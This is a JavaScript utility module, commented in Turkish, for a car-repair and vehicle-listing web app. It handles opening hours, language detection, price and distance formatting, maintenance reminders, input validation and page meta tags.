import { DAY_KEYS, DAY_LABELS, DAY_LABELS_BY_LANG, CLOSED_LABEL_BY_LANG, APPT_STATUS_LABELS_BY_LANG, TODAY, LEGAL_TIRE_RULES, DICT_TR_EN, DICT_EN_TR, ADMIN_SLA_DAYS, FIXED_PRICE_KEYWORDS, VARIABLE_PRICE_KEYWORDS, PRICE_LEVEL_BREAKS, TR_ASCII_MAP, CAR_BRANDS } from "../data/constants.js";

// `t` opsiyonel: verilmezse (eski çağrılar) geriye dönük uyumluluk için sabit Türkçe metin döner.
export function jobStatusMeta(status, t) {
  return status === "closed"
    ? { label: t ? t("jobStatusClosedLabel") : "Kapatıldı", color: "bg-gray-400" }
    : { label: t ? t("jobStatusOpenLabel") : "Açık", color: "bg-green-500" };
}

// GERÇEK HATA DÜZELTMESİ: appointment.status iş mantığında kullanılan ham Türkçe bir değer (bkz.
// constants.ts APPT_STATUS_LABELS_BY_LANG yorumu) — bu SADECE ekrana yazılacak metni aktif dile
// çevirir, durumun kendisini (karşılaştırmalarda kullanılan orijinal string) değiştirmez.
export function apptStatusLabel(status, lang) {
  return (APPT_STATUS_LABELS_BY_LANG[lang] || APPT_STATUS_LABELS_BY_LANG.tr)[status] || status;
}

// apptStatusLabel ile AYNI desen, genel amaçlı: yakıt tipi/vites/kasa tipi/çekiş/çalışma
// şekli/deneyim seviyesi gibi ham Türkçe sabit-liste değerlerini SADECE ekranda göstermek için
// çevirir. Kullanıcının eklediği özel (custom) değerler haritada bulunamaz ve olduğu gibi
// (değiştirilmeden) döner — bu tasarım gereği, çünkü kullanıcı tanımlı metinlerin çevirisi yok.
export function vocabLabel(value, lang, labelsByLang) {
  if (!value) return value;
  return (labelsByLang[lang] || labelsByLang.tr)[value] || value;
}

export function genSlots(start, end) {
  const slots = [];
  let [h, m] = start.split(":").map(Number);
  const [eh, em] = end.split(":").map(Number);
  while (h < eh || (h === eh && m < em)) {
    slots.push(`${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}`);
    m += 30;
    if (m >= 60) { m = 0; h++; }
  }
  return slots;
}

export function getDaySlots(day) {
  const base = genSlots(day.start, day.end);
  const all = Array.from(new Set([...base, ...(day.extraSlots || [])])).sort();
  return all;
}

function addMinutesToTime(time, mins) {
  const [h, m] = time.split(":").map(Number);
  const total = h * 60 + m + mins;
  const hh = Math.floor(total / 60) % 24;
  const mm = total % 60;
  return `${String(hh).padStart(2, "0")}:${String(mm).padStart(2, "0")}`;
}

// GERÇEK HATA DÜZELTMESİ: genSlots yarı-açık bir aralık üretir (ör. 09:00-18:00 için son eleman
// "17:30"tür — bu son randevunun BAŞLAYABİLECEĞİ saattir, işletmenin kapandığı saat değil). Eskiden
// hem burada hem AppShell.tsx'teki gün özeti rozetinde kapanış saati doğrudan
// `slots[slots.length - 1]` olarak gösteriliyordu — yani her tamirci için gerçek kapanışından
// (ör. 18:00) 30 dakika erken bir saat (17:30) hem müşteriye gösterilen saatlerde hem "şu an açık"
// göstergesinde (isOpenNowByHoursText bu metni parse ediyor) yanlış sonuç veriyordu. Son slotun
// BAŞLANGICINA 30 dakika ekleyerek gerçek kapanış saatini elde ediyoruz — normal günlerde bu
// zaten d.end'e eşittir, "ekstra slot" ile normal saatlerin ötesine uzatılmış günlerde ise
// gerçek uzatılmış kapanış saatini doğru yansıtır.
export function dayClosingTime(day) {
  const slots = getDaySlots(day);
  if (!slots.length) return day.end;
  return addMinutesToTime(slots[slots.length - 1], 30);
}

// GERÇEK HATA DÜZELTMESİ: bir tamirci tek tek slotları kapatabiliyordu (ör. öğle arası için 12:00
// ve 12:30'u kapatmak) — toggleSlotClosed, day.closedSlots'a yazıyordu ve randevu alınabilir
// saatleri doğru filtreliyordu (bkz. slotsForDate), AMA formatHoursText/isOpenNowByHoursText bunu
// hiç dikkate almadan hep tek bir "başlangıç-bitiş" aralığı üretiyordu. Böylece müşteriye gösterilen
// saatler ve "şu an açık" rozeti, mekanik günün ortasında bir dilimi kapatsa bile hiç değişmiyordu.
// Burada açık slotları ardışık bloklara ayırıp, kapalı bir aralığın önce/sonrasını AYRI aralıklar
// olarak döndürüyoruz (ör. "09:00-12:00, 13:00-18:00").
export function dayHoursRanges(day) {
  if (!day.open) return [];
  const closed = new Set(day.closedSlots || []);
  const openSlots = getDaySlots(day).filter((s) => !closed.has(s));
  if (!openSlots.length) return [];
  const ranges = [];
  let rangeStart = openSlots[0];
  let prev = openSlots[0];
  for (let i = 1; i < openSlots.length; i++) {
    const slot = openSlots[i];
    if (slot === addMinutesToTime(prev, 30)) { prev = slot; continue; }
    ranges.push([rangeStart, addMinutesToTime(prev, 30)]);
    rangeStart = slot;
    prev = slot;
  }
  ranges.push([rangeStart, addMinutesToTime(prev, 30)]);
  return ranges;
}

// GERÇEK HATA DÜZELTMESİ: gün isimleri ("Pzt", "Kapalı" vb.) eskiden hep DAY_LABELS/"Kapalı" ile
// sabit Türkçe üretiliyordu — dil seçeneği İngilizce/Almanca yapılsa bile Öffnungszeiten (çalışma
// saatleri) bölümü hep Türkçe kalıyordu. `lang` parametresi eklendi; verilmezse (ör. eski
// çağrılar) geriye dönük uyumluluk için "tr" varsayılıyor.
export function formatHoursText(hours, lang) {
  const labels = DAY_LABELS_BY_LANG[lang] || DAY_LABELS;
  const closedText = CLOSED_LABEL_BY_LANG[lang] || CLOSED_LABEL_BY_LANG.tr;
  const groups = [];
  DAY_KEYS.forEach((k) => {
    const d = hours[k];
    const ranges = dayHoursRanges(d);
    const text = ranges.length ? ranges.map(([s, e]) => `${s}-${e}`).join(", ") : closedText;
    groups.push(`${labels[k]}: ${text}`);
  });
  return groups;
}

export function parseListingPrice(p) {
  if (!p) return 0;
  return Number(String(p).replace(/[^\d]/g, "")) || 0;
}

// ==================== ÜLKE / DİL OTOMATİK TESPİTİ ====================
// Kullanıcıya HİÇBİR ŞEY SORMADAN, konum izni İSTEMEDEN ve IP işlemeden ülke tahmini yapar.
// İki sinyal kullanılır:
//   1) Cihazın saat dilimi (Intl) — "Europe/Istanbul" gibi. Ülke için şaşırtıcı derecede güvenilir,
//      çünkü kullanıcı fiziksel olarak neredeyse saat dilimi de odur.
//   2) Tarayıcı dili (navigator.language) — "tr-TR" gibi. Bölge eki varsa yedek sinyal.
// Saat dilimine ÖNCELİK verilir: Almanya'da yaşayan bir kullanıcının tarayıcı dili "tr-TR" olabilir
// ama saat dilimi "Europe/Berlin"dir; fiziksel konum sorusunun doğru cevabı ikincisidir.
// KVKK/GDPR notu: burada hiçbir kişisel veri sunucuya gönderilmiyor, IP kaydı tutulmuyor — tespit
// tamamen tarayıcının kendi ayarlarından, istemci tarafında yapılıyor.
const TIMEZONE_COUNTRY = {
  "Europe/Istanbul": "TR",
  "Asia/Istanbul": "TR",
  "Europe/Berlin": "DE", "Europe/Busingen": "DE",
  "Europe/Vienna": "AT",
  "Europe/Zurich": "CH",
  "Europe/London": "GB",
  "Europe/Amsterdam": "NL",
  "Europe/Brussels": "BE",
  "Europe/Paris": "FR",
  "Europe/Madrid": "ES",
  "Europe/Rome": "IT",
  "Europe/Nicosia": "CY", "Asia/Nicosia": "CY", "Asia/Famagusta": "CY",
};

/** Kullanıcının bulunduğu ülkenin ISO kodu ("TR", "DE", ...) veya tespit edilemezse null. */
export function detectCountryCode() {
  try {
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    if (tz && TIMEZONE_COUNTRY[tz]) return TIMEZONE_COUNTRY[tz];
  } catch { /* Intl yoksa/desteklenmiyorsa dil sinyaline düş */ }
  try {
    // "tr-TR" → "TR". Bölge eki olmayan ("tr" gibi) değerlerden ülke çıkarılamaz.
    const region = String(navigator?.language || "").split("-")[1];
    if (region && region.length === 2) return region.toUpperCase();
  } catch { /* navigator yoksa (SSR/test) sessizce geç */ }
  return null;
}

/** Ülke kodundan sitenin desteklediği dile eşleme. Bilinmeyen ülkelerde ortak dil olarak İngilizce. */
export function langForCountry(country) {
  if (country === "TR" || country === "CY") return "tr";
  if (country === "DE" || country === "AT" || country === "CH") return "de";
  return country ? "en" : null;
}

export const LANG_STORAGE_KEY = "fixperto_lang";
const SUPPORTED_LANGS = ["tr", "en", "de"];

/**
 * Site açılışındaki dil. Öncelik sırası:
 *   1) Kullanıcının DAHA ÖNCE kendi seçtiği dil (localStorage) — otomatik tespit bunu asla ezmez.
 *   2) Saat dilimi/tarayıcıdan tespit edilen ülkenin dili.
 *   3) Tarayıcı dilinin kendisi (desteklenen bir dilse).
 *   4) Türkçe.
 * Giriş yapan kullanıcının HESABINDA kayıtlı dil bundan da önceliklidir; o, oturum açıldıktan sonra
 * AppLogicProvider'daki efektle uygulanır (cihaz değişse bile kendi dilini görsün).
 */
export function initialSiteLang() {
  try {
    const saved = localStorage.getItem(LANG_STORAGE_KEY);
    if (saved && SUPPORTED_LANGS.includes(saved)) return saved;
  } catch { /* localStorage kapalıysa (gizli sekme vb.) tespite düş */ }
  const byCountry = langForCountry(detectCountryCode());
  if (byCountry && SUPPORTED_LANGS.includes(byCountry)) return byCountry;
  try {
    const base = String(navigator?.language || "").split("-")[0].toLowerCase();
    if (SUPPORTED_LANGS.includes(base)) return base;
  } catch { /* yoksa varsayılana düş */ }
  return "tr";
}

/** Kullanıcının AÇIKÇA seçtiği dili hatırla — bir daha otomatik tespitle ezilmesin. */
export function rememberSiteLang(l) {
  try { localStorage.setItem(LANG_STORAGE_KEY, l); } catch { /* yazılamıyorsa sorun değil, oturum içi state yeterli */ }
}

// Serbest metin sayısal alanları ("1.6", "2.0 TDI", "6,5 l/100km", "77 kWh") tek bir ondalık sayıya
// çevirir. parseListingPrice'tan farkı: burada ondalık ayırıcı KORUNUYOR (motor hacmi/yakıt tüketimi
// gibi alanlarda 1.6 ile 16 arasındaki fark kritik). Türkçe virgüllü yazım da destekleniyor.
export function parseDecimalField(v) {
  if (v === null || v === undefined) return null;
  const m = String(v).replace(",", ".").match(/-?\d+(\.\d+)?/);
  if (!m) return null;
  const n = Number(m[0]);
  return Number.isFinite(n) ? n : null;
}

// AutoScout24'teki "Preisbewertung" (fiyat değerlendirmesi) mantığı: bir ilanın fiyatını AYNI
// marka+modeldeki diğer aktif ilanların MEDYANIYLA karşılaştırır. Medyan seçilmesinin nedeni tek bir
// uçuk fiyatlı ilanın ortalamayı bozmasını engellemek. En az 2 karşılaştırma ilanı yoksa null döner —
// az veriyle "ucuz/pahalı" etiketi basmak yanıltıcı olurdu.
// Not: bu fonksiyon saf (pure) ve modül seviyesinde tutuluyor; hem ilan detayındaki rozet hem de
// filtreleme (listingFilters.priceRating) aynı kaynağı kullansın diye.
export function listingMarketPriceTier(listing, allListings) {
  if (!listing) return null;
  const ownPrice = parseListingPrice(listing.price);
  if (!ownPrice) return null;
  const samePrices = (allListings || [])
    .filter((l) => l.id !== listing.id && !l.adminRemoved && l.status === "active" && l.brand === listing.brand && l.model === listing.model)
    .map((l) => parseListingPrice(l.price))
    .filter((p) => p > 0)
    .sort((a, b) => a - b);
  if (samePrices.length < 2) return null;
  const mid = Math.floor(samePrices.length / 2);
  const median = samePrices.length % 2 === 0 ? (samePrices[mid - 1] + samePrices[mid]) / 2 : samePrices[mid];
  if (!median) return null;
  const diffPercent = Math.round(((ownPrice - median) / median) * 100);
  const tier = diffPercent <= -5 ? "below" : diffPercent >= 5 ? "above" : "average";
  return { diffPercent, tier, sampleSize: samePrices.length };
}

// Bir tamircinin hoursText/formatHoursText çıktısındaki 7 satırdan (Pzt..Paz sırasıyla), o günün ve
// gerçek saatin (cihaz saati) durumuna göre "şu an açık mı" hesaplar. Bilinmiyorsa null döner.
export function isOpenNowByHoursText(lines) {
  if (!lines || lines.length < 7) return null;
  const now0 = new Date();
  const dayIdx = (now0.getDay() + 6) % 7; // 0=Pzt ... 6=Paz, DAY_KEYS ile aynı sıra
  const line = lines[dayIdx];
  if (!line) return null;
  const rest = line.split(/:(.+)/)[1];
  if (!rest) return null;
  const trimmed = rest.trim();
  if (/kapalı|closed|geschlossen/i.test(trimmed)) return false;
  // dayHoursRanges artık öğle arası gibi ara kapatmalarda birden fazla, virgülle ayrılmış aralık
  // üretebiliyor (ör. "09:00-12:00, 13:00-18:00") — matchAll ile TÜMÜNÜ kontrol ediyoruz, sadece
  // ilkini değil.
  const rangeMatches = [...trimmed.matchAll(/(\d{1,2}):(\d{2})\s*-\s*(\d{1,2}):(\d{2})/g)];
  if (!rangeMatches.length) return null;
  const now = new Date();
  const nowMin = now.getHours() * 60 + now.getMinutes();
  return rangeMatches.some((m) => {
    const startMin = parseInt(m[1], 10) * 60 + parseInt(m[2], 10);
    const endMin = parseInt(m[3], 10) * 60 + parseInt(m[4], 10);
    return nowMin >= startMin && nowMin <= endMin;
  });
}

// Fiyatı 1-5 arası bir "€" seviyesine çevirir (Google Haritalar tarzı ucuz/pahalı göstergesi).
export function priceLevel(price) {
  const p = Number(price) || 0;
  if (p <= PRICE_LEVEL_BREAKS[0]) return 1;
  if (p <= PRICE_LEVEL_BREAKS[1]) return 2;
  if (p <= PRICE_LEVEL_BREAKS[2]) return 3;
  if (p <= PRICE_LEVEL_BREAKS[3]) return 4;
  return 5;
}

/**
 * Mesafeyi ekranda gösterilecek metne çevirir.
 *
 * GERÇEK HATA DÜZELTMESİ: eskiden her yerde doğrudan `dist.toFixed(1)` çağrılıyordu. Yeni kaydolan
 * bir tamircide `distance`, `lat` ve `lng` sütunları NULL olduğu için (henüz adresi yok — mesafe
 * GERÇEKTEN bilinmiyor) bu çağrı `Cannot read properties of null (reading 'toFixed')` ile tüm
 * uygulamayı çökertiyordu.
 *
 * Bilinmeyen mesafede 0 yazmıyoruz: "0.0 km" kullanıcıya "kapının önünde" gibi bir YALAN söyler.
 * Bunun yerine "—" gösteriyoruz; dürüst ve görsel olarak da sakin.
 */
export function formatDistanceKm(d) {
  // DİKKAT — buradaki en kritik satır: Number(null) === 0 ve Number("") === 0'dır, NaN DEĞİL.
  // Sadece Number.isFinite ile kontrol etseydik "bilinmiyor" değeri sessizce "0.0 km"e dönüşür,
  // yani kullanıcıya "bu servis kapının önünde" gibi bir yalan söylerdik. Bu yüzden null/undefined/
  // boş metin ÖNCE ve açıkça eleniyor. (Bu tam olarak testin yakaladığı hataydı.)
  if (d === null || d === undefined || d === "") return "—";
  const n = Number(d);
  return Number.isFinite(n) ? `${n.toFixed(1)} km` : "—";
}

/** Puan/fiyat gibi sayısal alanlar için aynı gerekçeyle güvenli biçimlendirme. */
export function formatNumber(v, digits = 1, fallback = "—") {
  if (v === null || v === undefined || v === "") return fallback; // bkz. formatDistanceKm notu
  const n = Number(v);
  return Number.isFinite(n) ? n.toFixed(digits) : fallback;
}

export function haversineDistanceKm(lat1, lng1, lat2, lng2) {
  const R = 6371;
  const toRad = (v) => (v * Math.PI) / 180;
  const dLat = toRad(lat2 - lat1);
  const dLng = toRad(lng2 - lng1);
  const a = Math.sin(dLat / 2) ** 2 + Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) * Math.sin(dLng / 2) ** 2;
  return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
}

export function isValidDateStr(str) {
  if (!str) return false;
  const d = new Date(str);
  if (isNaN(d.getTime())) return false;
  // Guard against JS Date's auto-rollover (e.g. 2026-02-30 silently becomes 2026-03-02)
  if (/^\d{4}-\d{2}-\d{2}$/.test(str)) {
    const [y, mo, day] = str.split("-").map(Number);
    if (d.getFullYear() !== y || d.getMonth() + 1 !== mo || d.getDate() !== day) return false;
  }
  return true;
}

export function isFixedPriceService(name) {
  const n = (name || "").toLocaleLowerCase("tr-TR");
  if (VARIABLE_PRICE_KEYWORDS.some((k) => n.includes(k))) return false;
  return FIXED_PRICE_KEYWORDS.some((k) => n.includes(k));
}

export function parsePriceNumber(priceStr) {
  return parseInt(String(priceStr || "").replace(/[^\d]/g, ""), 10) || 0;
}

export function listingCurrency(priceStr) {
  if (priceStr && priceStr.includes("€")) return "€";
  return "₺";
}

export function isValidEmail(str) {
  if (!str || !str.trim()) return false;
  return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(str.trim());
}

export function validatePhone(raw) {
  const v = (raw || "").trim().replace(/[\s()-]/g, "");
  if (!v) return { valid: false, message: "Telefon numarası gerekli." };
  if (v.startsWith("+90")) {
    return /^\+90\d{10}$/.test(v)
      ? { valid: true }
      : { valid: false, message: "Geçersiz telefon numarası. +90'dan sonra 10 haneli numara girin (örn. +90 532 123 45 67)." };
  }
  if (v.startsWith("+49")) {
    return /^\+49\d{6,11}$/.test(v)
      ? { valid: true }
      : { valid: false, message: "Geçersiz telefon numarası. +49'dan sonra Almanya numarası girin (örn. +49 151 2345678)." };
  }
  return { valid: false, message: "Geçersiz telefon numarası. Türkiye için +90, Almanya için +49 ülke koduyla eksiksiz girin." };
}

const REMINDER_LABELS_LOCAL = { inspection: "Araç Muayenesi", maintenance: "Periyodik Bakım", "tire-winter": "Kışlık Lastik", "tire-summer": "Yazlık Lastik", insurance: "Sigorta Yenileme", battery: "Akü ve Cam Suyu Kontrolü" };

// Sistemin önerdiği hatırlatma "aday"larını üretir; kullanıcı bunları vehicle.reminderOverrides ile
// kapatabilir, kendi tarihini girebilir ya da kaç gün önceden hatırlatılacağını kendisi belirleyebilir.
export function computeReminders(v) {
  if (!v) return [];
  const overrides = v.reminderOverrides || {};
  const legal = LEGAL_TIRE_RULES[v.country] || LEGAL_TIRE_RULES.tr;
  const year = TODAY.getFullYear();
  const mkDate = (monthDay, y) => { const [mo, d] = monthDay.split("-").map(Number); return new Date(y, mo - 1, d); };
  const nextOccurrence = (monthDay) => { let d = mkDate(monthDay, year); if (d < TODAY) d = mkDate(monthDay, year + 1); return d; };
  const cityLabel = v.city ? `${v.city} için resmi tarih` : "Resmi tarih";
  const candidates = [];
  if (v.lastInspection) { const due = new Date(v.lastInspection); due.setMonth(due.getMonth() + 24); candidates.push({ kind: "inspection", icon: "🛂", label: REMINDER_LABELS_LOCAL.inspection, dueDate: due, defaultLeadDays: 45, legalNote: "Kanunen zorunlu araç muayenesi." }); }
  if (v.lastMaintenance) { const due = new Date(v.lastMaintenance); due.setMonth(due.getMonth() + 6); candidates.push({ kind: "maintenance", icon: "🧰", label: REMINDER_LABELS_LOCAL.maintenance, dueDate: due, defaultLeadDays: 30, legalNote: null }); }
  if (v.tireType === "mevsimlik") {
    const winterDue = nextOccurrence(legal.winterMonthDay);
    candidates.push({ kind: "tire-winter", icon: "❄️", label: REMINDER_LABELS_LOCAL["tire-winter"], dueDate: winterDue, defaultLeadDays: 21, legalNote: `${legal.label}. ${cityLabel}: ${winterDue.toLocaleDateString("tr-TR")}.` });
    const summerDue = nextOccurrence(legal.summerMonthDay);
    candidates.push({ kind: "tire-summer", icon: "☀️", label: REMINDER_LABELS_LOCAL["tire-summer"], dueDate: summerDue, defaultLeadDays: 21, legalNote: `${legal.label}. ${cityLabel}: ${summerDue.toLocaleDateString("tr-TR")}.` });
  }
  if (v.insuranceEnd) { candidates.push({ kind: "insurance", icon: "🛡️", label: REMINDER_LABELS_LOCAL.insurance, dueDate: new Date(v.insuranceEnd), defaultLeadDays: 30, legalNote: "Trafik sigortası kanunen zorunludur." }); }
  candidates.push({ kind: "battery", icon: "🪫", label: REMINDER_LABELS_LOCAL.battery, dueDate: null, defaultLeadDays: 0, legalNote: null, staticDetail: "Mevsim geçişlerinde kontrol edilmesi önerilir." });
  const reminders = [];
  for (const c of candidates) {
    const ov = overrides[c.kind];
    if (ov && ov.enabled === false) continue;
    const hasCustomLead = ov && ov.leadDays !== undefined && ov.leadDays !== null && ov.leadDays !== "";
    const leadDays = hasCustomLead ? Number(ov.leadDays) : c.defaultLeadDays;
    const effectiveDue = (ov && ov.customDate) ? new Date(ov.customDate) : c.dueDate;
    const customized = !!(ov && (ov.customDate || hasCustomLead));
    if (!effectiveDue) { reminders.push({ kind: c.kind, icon: c.icon, title: c.label, detail: c.staticDetail || "", urgent: false, dueDate: null, leadDays, customized, legalNote: c.legalNote }); continue; }
    const daysLeft = Math.round((effectiveDue.getTime() - TODAY.getTime()) / 86400000);
    const overdue = daysLeft < 0;
    const title = overdue ? `${c.label} Süresi Geçti!` : `${c.label} Zamanı Yaklaşıyor`;
    const dateInfo = overdue ? `${effectiveDue.toLocaleDateString("tr-TR")} tarihinde sona erdi.` : `${effectiveDue.toLocaleDateString("tr-TR")} tarihine ${daysLeft} gün kaldı.`;
    const legalSuffix = customized ? " (Kendi belirlediğiniz hatırlatma)" : (c.legalNote ? ` ${c.legalNote}` : "");
    reminders.push({ kind: c.kind, icon: c.icon, title, detail: dateInfo + legalSuffix, urgent: overdue || daysLeft <= Math.min(7, leadDays), dueDate: effectiveDue, leadDays, customized, legalNote: c.legalNote });
  }
  // Kullanıcının kendi eklediği hatırlatmalar (sistemin önerdiklerine ek olarak)
  for (const cr of (v.customReminders || [])) {
    const due = new Date(cr.date);
    if (isNaN(due.getTime())) continue;
    const leadDays = Number(cr.leadDays) || 7;
    const daysLeft = Math.round((due.getTime() - TODAY.getTime()) / 86400000);
    const overdue = daysLeft < 0;
    const title = overdue ? `${cr.title} Süresi Geçti!` : `${cr.title} Yaklaşıyor`;
    const detail = overdue ? `${due.toLocaleDateString("tr-TR")} tarihinde sona erdi.` : `${due.toLocaleDateString("tr-TR")} tarihine ${daysLeft} gün kaldı.`;
    reminders.push({ kind: `custom-${cr.id}`, icon: "📌", title, detail, urgent: overdue || daysLeft <= Math.min(7, leadDays), dueDate: due, leadDays, customized: true, isUserCreated: true, customId: cr.id });
  }
  return reminders;
}

export function mockTranslate(text, fromLang, toLang) {
  if (fromLang === toLang) return text;
  const lower = text.trim().toLowerCase();
  const dict = fromLang === "tr" ? DICT_TR_EN : fromLang === "en" ? DICT_EN_TR : null;
  if (dict && dict[lower]) return dict[lower].charAt(0).toUpperCase() + dict[lower].slice(1);
  return `[${toLang.toUpperCase()}] ${text}`;
}

export function statusColor(status) {
  if (status === "Onay Bekliyor") return "bg-gray-100 text-gray-700";
  if (status === "Sırada") return "bg-gray-100 text-gray-700";
  if (status === "Tamire Alındı") return "bg-rose-50 text-rose-600";
  if (status === "Reddedildi" || status === "İptal Edildi" || status === "Gelmedi") return "bg-red-50 text-red-500";
  return "bg-green-50 text-green-600";
}

export function isImgUrl(s) {
  return typeof s === "string" && (s.startsWith("blob:") || s.startsWith("http://") || s.startsWith("https://") || s.startsWith("data:"));
}

// Basit gri kutu — gerçek fotoğraf linki (ör. Wikimedia Commons) yüklenemezse
// kırık resim ikonu yerine bunu gösteriyoruz, sayfa hiç bozuk görünmüyor.
export const IMG_FALLBACK = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 300'%3E%3Crect width='400' height='300' fill='%23e5e7eb'/%3E%3C/svg%3E";

export function imgFallbackHandler(e) {
  e.currentTarget.onerror = null;
  e.currentTarget.src = IMG_FALLBACK;
}

// Wikimedia Commons Special:FilePath linkleri ?width=N parametresiyle otomatik
// olarak küçültülmüş bir görsele yönlendiriliyor — kart/liste gibi küçük alanlarda
// gereksiz yere büyük orijinal dosyayı indirmemek için genişliği bağlama göre ayarlıyoruz.
export function imgThumb(url, width) {
  if (typeof url !== "string" || !url.includes("width=")) return url;
  return url.replace(/width=\d+/, `width=${width}`);
}

export function monthsBetween(d1, d2) {
  return (d2.getFullYear() - d1.getFullYear()) * 12 + (d2.getMonth() - d1.getMonth());
}

export function initials(name) {
  if (!name) return "?";
  return name.trim().split(" ").slice(0, 2).map((w) => w[0]).join("").toUpperCase();
}

export function listingStatusMeta(status, t) {
  if (status === "reserved") return { label: t("statusReserved"), color: "bg-gray-900" };
  if (status === "sold") return { label: t("statusSold"), color: "bg-red-500" };
  return { label: t("statusActive"), color: "bg-green-500" };
}

export function slugifyForEmail(name) {
  const ascii = (name || "").toLocaleLowerCase("tr-TR").split("").map((ch) => TR_ASCII_MAP[ch] || ch).join("");
  return ascii.replace(/[^a-z0-9]+/g, ".").replace(/^\.+|\.+$/g, "");
}

export function ticketDaysOpen(tk) {
  return Math.max(0, Math.round((TODAY.getTime() - new Date(tk.createdDate).getTime()) / 86400000));
}

export function ticketSlaBreached(tk) {
  if (tk.status === "resolved") return false;
  return ticketDaysOpen(tk) > (ADMIN_SLA_DAYS[tk.priority] || 5);
}

// ---------------------------------------------------------------------------------------------
// lc() — arama/filtreleme için GÜVENLİ küçük harfe çevirme.
// ---------------------------------------------------------------------------------------------
// GERÇEK HATA DÜZELTMESİ: arama filtreleri alanlara doğrudan `.toLowerCase()` uyguluyordu
// (m.name, m.specialty, j.title, j.mechanicName...). Bu alanlar veritabanında NULL olabiliyor —
// örneğin kayıt sırasında uzmanlık alanı girilmeyen bir tamircide `specialty` NULL kalıyor.
// Sonuç: "Cannot read properties of null (reading 'toLowerCase')" ile TÜM uygulama çöküyordu.
// Üstelik tamirci/araç/iş listeleri aynı `query` state'ini paylaşan ayrı useMemo'lar olduğu için
// tek bir NULL kayıt, araç veya ilan aramasını da çökertiyordu.
// Türkçe'ye özgü i/İ dönüşümü için toLocaleLowerCase("tr-TR") kullanılıyor: "İSTANBUL" → "istanbul".
export function lc(value) {
  return String(value ?? "").toLocaleLowerCase("tr-TR");
}

/** Serbest yazılmış markayı listedeki resmi yazımına çevirir ("bmw " → "BMW"). Listede yoksa aynen döner. */
export function canonicalBrand(value) {
  const v = String(value ?? "").trim();
  if (!v) return "";
  return CAR_BRANDS.find((b) => lc(b) === lc(v)) || v;
}

/**
 * Bir hizmetin BELİRLİ BİR MARKA için girilmiş fiyatını döndürür; yoksa null.
 *
 * Neden düz `s.brandPrices[brand]` yetmiyor: eşleşme metin eşitliğine dayanıyor. Marka seçimi
 * listeye çekilmeden önce kaydedilmiş araçlarda marka "bmw", "Bmw" ya da " BMW " gibi duruyor
 * olabilir; bunlar tamircinin "BMW" anahtarıyla eşleşmez ve müşteri sessizce yanlış (varsayılan)
 * fiyatı görür. Bu yüzden önce birebir, sonra tr-TR küçük harf karşılaştırmasıyla arıyoruz —
 * yani ESKİ kayıtlar da düzeltme gerektirmeden doğru fiyata bağlanıyor.
 *
 * Boş string bir fiyat DEĞİLDİR: tamirci markayı listeye ekleyip fiyatı boş bırakmış olabilir;
 * o durumda varsayılan fiyata düşmek doğrudur.
 */
export function brandPriceFor(service, brand) {
  const bp = service?.brandPrices;
  if (!bp || !brand) return null;
  const has = (v) => v != null && String(v).trim() !== "";
  if (has(bp[brand])) return String(bp[brand]);
  const key = Object.keys(bp).find((k) => lc(k) === lc(brand));
  return key != null && has(bp[key]) ? String(bp[key]) : null;
}

// ---------------------------------------------------------------------------------------------
// setPageMeta — sayfa başlığı ve arama motoru / paylaşım meta etiketleri
// ---------------------------------------------------------------------------------------------
// Bu uygulama tek sayfalık (SPA): tarayıcı hiçbir zaman yeni bir HTML belgesi yüklemiyor, bu
// yüzden <title> ve <meta> etiketleri ekran değiştikçe ELLE güncellenmeli. Aksi halde her sayfa
// aynı başlıkla görünür — hem tarayıcı sekmesinde hem WhatsApp/X paylaşım önizlemesinde.
//
// DÜRÜST SINIR: sunucu tarafı render (SSR) olmadığı için, JavaScript çalıştırmayan basit botlar
// bu etiketleri göremez. Googlebot JS çalıştırır, ama sosyal medya önizleme botlarının çoğu
// çalıştırmaz. Tam çözüm ön-render/SSR gerektirir; bu fonksiyon o adıma kadar doğru olanı yapıyor.
const upsertMeta = (selector, attrs) => {
  if (typeof document === "undefined") return;
  let el = document.head.querySelector(selector);
  if (!el) {
    el = document.createElement(selector.startsWith("link") ? "link" : "meta");
    for (const [k, v] of Object.entries(attrs)) el.setAttribute(k, String(v));
    document.head.appendChild(el);
    return;
  }
  for (const [k, v] of Object.entries(attrs)) el.setAttribute(k, String(v));
};

export function setPageMeta({ title, description, image, canonicalPath, jsonLd }: {
  title?: string; description?: string; image?: string | null; canonicalPath?: string; jsonLd?: unknown;
} = {}) {
  if (typeof document === "undefined") return;
  const full = title ? `${title} · Fixperto` : "Fixperto";
  document.title = full;
  if (description) {
    upsertMeta('meta[name="description"]', { name: "description", content: description });
    upsertMeta('meta[property="og:description"]', { property: "og:description", content: description });
  }
  upsertMeta('meta[property="og:title"]', { property: "og:title", content: full });
  upsertMeta('meta[property="og:type"]', { property: "og:type", content: jsonLd ? "article" : "website" });
  if (image) upsertMeta('meta[property="og:image"]', { property: "og:image", content: image });
  upsertMeta('meta[name="twitter:card"]', { name: "twitter:card", content: image ? "summary_large_image" : "summary" });
  if (canonicalPath && typeof window !== "undefined") {
    upsertMeta('link[rel="canonical"]', { rel: "canonical", href: `${window.location.origin}${canonicalPath}` });
    upsertMeta('meta[property="og:url"]', { property: "og:url", content: `${window.location.origin}${canonicalPath}` });
  }
  // JSON-LD: arama motoruna "bu bir makale, yazarı şu, yayın tarihi bu" diye yapılandırılmış
  // veri verir — zengin sonuç (rich result) görünümünün ön koşulu.
  const existing = document.getElementById("fixperto-jsonld");
  if (existing) existing.remove();
  if (jsonLd) {
    const script = document.createElement("script");
    script.type = "application/ld+json";
    script.id = "fixperto-jsonld";
    script.textContent = JSON.stringify(jsonLd);
    document.head.appendChild(script);
  }
}

// ==================== SAYFA YENİLEMEDE BULUNULAN EKRANI KORUMA ====================
// SORUN: uygulamada URL yönlendiricisi yok; tüm gezinme React state'inde tutuluyor. Bu yüzden
// F5 / yenile tuşu kullanıcıyı her zaman ana sayfaya atıyordu — bir tamircinin profilini
// okurken sayfayı tazeleyen kişi baştan başlıyordu.
//
// ÇÖZÜM: gezinme durumunu sessionStorage'a yazıp açılışta geri okuyoruz. localStorage DEĞİL,
// sessionStorage: kapsam SEKME bazında olmalı. localStorage kullanılsaydı, kullanıcının haftalar
// önce açtığı bir ekran yepyeni bir sekmede karşısına çıkardı — beklenen davranış bu değil.
